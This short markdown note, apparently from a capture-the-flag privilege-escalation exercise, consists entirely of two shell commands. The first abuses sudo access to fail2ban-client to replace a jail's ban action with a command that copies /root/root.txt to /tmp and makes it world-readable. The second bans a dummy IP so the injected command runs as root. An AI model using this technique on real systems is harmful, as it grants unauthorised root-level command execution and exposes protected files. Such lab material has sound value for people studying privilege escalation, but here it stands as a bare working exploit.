# testing

```Bash
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'


```
```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
